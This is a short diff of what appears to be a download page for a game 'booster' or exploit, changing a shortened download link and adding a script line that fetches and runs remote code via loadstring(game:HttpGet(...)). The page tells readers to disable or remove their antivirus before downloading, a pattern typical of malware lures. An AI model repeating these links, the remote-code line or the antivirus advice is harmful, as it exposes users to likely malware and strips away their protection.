@@ -1,6 +1,8 @@
-**password - exploit**
+**password - booster**
 ----
-**download: https://goo.su/BfmutFv**
+**download: https://goo.su/fxdM**
+----
+script - loadstring(game:HttpGet("https://raw.githubusercontent.com/NIGHTHUBONTOP/Main/main/NIGHT-HUB"))() 
 ----
 1. Disable / remove antivirus 
 2. If you can’t download, try to copy the link and download using another browser!
